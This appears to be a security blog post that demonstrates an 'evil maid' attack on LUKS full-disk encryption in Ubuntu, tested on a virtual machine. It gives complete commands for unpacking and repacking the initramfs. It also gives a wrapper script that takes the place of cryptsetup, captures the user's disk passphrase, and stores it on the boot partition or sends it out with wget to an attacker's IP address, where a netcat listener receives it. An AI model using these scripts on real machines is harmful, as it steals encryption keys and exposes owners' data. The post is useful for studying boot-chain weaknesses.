---
title: 'Attacking LUKS full-disk encryption'
layout: 'post'
tags: ["Security"]
---

{:toc}

When you setup a full-disk encryption in an installation of Linux distribution like Ubuntu or Debian, usually, the root partition is being encrypted and the boot partition is left unencrypted on the disk.

The unencrypted boot partition is for the practical reason where stuff from the boot partition will setup everything in a way that the root partition can be decrypted and OS can boot.

Output of the `lsblk` tool shows this quite nicely in an example Ubuntu installation where LVM and _"Encrypt the Ubuntu installation for security"_ has been selected during the installation:

```
nvme0n1               259:0    0 476,9G  0 disk  
├─nvme0n1p1           259:1    0   512M  0 part  /boot/efi
├─nvme0n1p2           259:2    0   1,7G  0 part  /boot
└─nvme0n1p3           259:3    0 474,8G  0 part  
  └─nvme0n1p3_crypt   253:0    0 474,8G  0 crypt
    ├─vgubuntu-root   253:1    0 472,8G  0 lvm   /
    └─vgubuntu-swap_1 253:2    0   1,9G  0 lvm   [SWAP]
```

There are different ways to setup full disk encryption and I'm mainly focusing in the way that is done by the installer in Ubuntu. This does, however, apply to other OS installers as well.

Simplified process, AFAIK, is that BIOS/UEFI loads the bootloader (e.g. grub2), bootloader loads the initramfs from the `/boot`, initramfs decrypts the `root` partition and then booting continues similarly as it would with or without disk encryption.

The idea of this attack is pretty simple and nothing new. I'm just testing this to verify what would be easiest way to hook between user and cryptsetup in initramfs.

I didn't know beforehand how Ubuntu passes the password from user input to cryptsetup, but eventually I figured out that it's just passed via stdin using `--keyfile=-` option.

The attack I'm demonstrating has the following prerequisites:

* Attacker has physical access to target machine
* Attacker is able to liveboot the OS via USB or CD.
* Alternative to liveboot is to remove target disk from the machine and mount that temporarily to another machine that is controlled by the attacker

Shortly explained the attack has the following steps:

![attack.png](/assets/luks-attack.png)

Attacker can now decrypt the root partition and access its content.

## Performing the attack

Minimal setup is to have one virtual machine or machine that doesn't have anything important on it.

### 1. Liveboot to the target machine and mount the target installation's boot drive

My target machine is virtual machine and I just use Ubuntu ISO to liveboot. Next commands will mount the boot partition to /mnt/boot`.

```sh
mkdir /mnt/boot
# /dev/vda3 -> unecnrypted /boot partition
mount /dev/vda3 /mnt/boot/
```

### 2. Unpack target installation's initramfs

Modify kernel variable to match the targeted kernel version. Usually newest version under `/mnt/boot`.

```
kernel=5.15.0-47-generic
mkdir -p /tmp/init/initramfs/
cd /tmp/init/
unmkinitramfs /mnt/boot/initrd.img-"$kernel" initramfs/
```

Now unpacked version of the original initramfs can found in `/tmp/init/initramfs/`.

### 3. Create a wrapper scipt for the cryptsetup

One could do something sophisticated like replace `cryptsetup` with a new compiled version that includes some malicious code for stealing the encryption key. I'm doing the lazy version and will replace the cryptsetup with a wrapper script.

The wrapper script captures the encryption key and then it passes the execution to the real cryptsetup with the key and requested parameters. User should still get the normal experience with the boot process. The wrapper script will store the encryption key on the unencrypted boot partition before passing execution to the real cryptsetup.

Attacker can then wait for an user to boot to the machine and later come back to steal the key when an user has booted the machine at least once.

The below commands will move the original cryptsetup to cryptsetup_real and initialize empty file for the wrapper script.

```
cd /tmp/init/initramfs/main/usr/sbin
mv cryptsetup cryptsetup_real
touch cryptsetup
chmod 755 cryptsetup
chmod 755 cryptsetup_real
```

Below is the content for the `/tmp/init/initramfs/main/usr/sbin/cryptsetup`. Edit this to the file.

```sh
#!/bin/sh

# /dev/stdin not available initramfs but piping this way should work
/bin/cat > pass
password=$(cat pass)
echo -n "$password"

########## Debugging ###############################
# If decryption fails and system boots to initramfs,
# you can check parameters and input,
# that were sent to the cryptsetup
/bin/echo "$password" > /stdin.txt
/bin/echo "$@" > /cmdout.txt
####################################################

# These commands mount the actual /boot partition,
# and store the encryption key on that
/bin/mkdir -p /mntboot
/bin/mount /dev/vda3 /mntboot
/bin/echo $password > /mntboot/.cryptpass_mitm
/bin/umount /mntboot

/bin/echo -n "$password" | /usr/sbin/cryptsetup_real "$@"
```

### 5. Repack modified initrd

`cd` to `/tmp/init` and store the below commands as script (e.g. `finalize.sh`) and execute it or just execute the commands one by one. Remember to modify `kernel` variable in here as well if you are launching this as a script or in a new terminal window.

```sh
DIR=/tmp/init/
kernel=5.15.0-47-generic
cd $DIR
# start with an empty file
rm -rf ${DIR}/myinitrd
touch ${DIR}/myinitrd

# Add the first microcode firmware
cd ${DIR}/initramfs/early
find . -print0 | cpio --null --create --format=newc > ${DIR}/myinitrd

# Add the second microcode firmware
cd ${DIR}/initramfs/early2
find kernel -print0 | cpio --null --create --format=newc >> ${DIR}/myinitrd

# Add the actual ram fs file system
cd ${DIR}/initramfs/main
find . | cpio --create --format=newc | xz --format=lzma >> ${DIR}/myinitrd
cat ${DIR}/myinitrd > /mnt/boot/initrd.img-"$kernel"
```

After these commands the original initrd file has been overwritten and you can power-off the machine.

### 6. Login to the machine acting like the real user

This is the part where the real user would boot the machine without knowing that an attacker has modified the initramfs content. Password for the disk encryption is stored to the boot partition when user enters the password. After booting pass the disk encryption phase you can power-off the machine. This just mimics a situation where user has done what they needed to do on the machine and the attacker now has a new chance to access the machine.

### 7. Liveboot back to the machine as an attacker and steal the encryption key

First, mount the boot partition from the disk.

```sh
mkdir /mnt/boot
# /dev/vda3 -> unecnrypted /boot partition
mount /dev/vda3 /mnt/boot/
```

Now you should be able to read the stolen encryption key from `cat /mnt/boot/.cryptpass_mitm`.

## Sending the password over the network

The previous attack has the inconvenient part where the attacker has to re-liveboot to get the stolen key from the machine, or at least they have to boot to initramfs, mount boot partition there, and read the key from there.

An alternative would be to send the password over the network if suitable connection is available. To try this, do the same steps as before, but replace the previous script with the one below and modify your "attacker machine's" IP in the place of the example IP.

```sh
#!/bin/sh

# /dev/stdin not available initramfs but piping this way should work
/bin/cat > pass
password=$(cat pass)
echo -n "$password"

########## Debugging ###############################
# If decryption fails and system boots to initramfs,
# you can check parameters and input,
# that were sent to the cryptsetup
/bin/echo "$password" > /stdin.txt
/bin/echo "$@" > /cmdout.txt
####################################################

# Request an IP address from DHCP server and send password
# to the attacker's machine
mkdir -p /var/run
/usr/sbin/dhclient -v || true
# Modify your attacker machine IP here
/bin/echo $password | /usr/bin/busybox wget http://192.168.122.1:1234/"$password" || true

/bin/echo -n "$password" | /usr/sbin/cryptsetup_real "$@"
```

Start netcat listener on your attacker machine `nc -w 1 -l -p 1234`. Ensure that your firewall allows this connection. After replacing the initrd, reboot the machine and give the encryption key as a user.

You should receive the password as part of the HTTP request's URL When wget executes the HTTP request. For example:

```sh
mtask@attacker:~$ nc -w 1 -l -p 1234
GET /SuperSecretKey1111 HTTP/1.1
Host: 192.168.122.1:1234
User-Agent: Wget
Connection: close
```
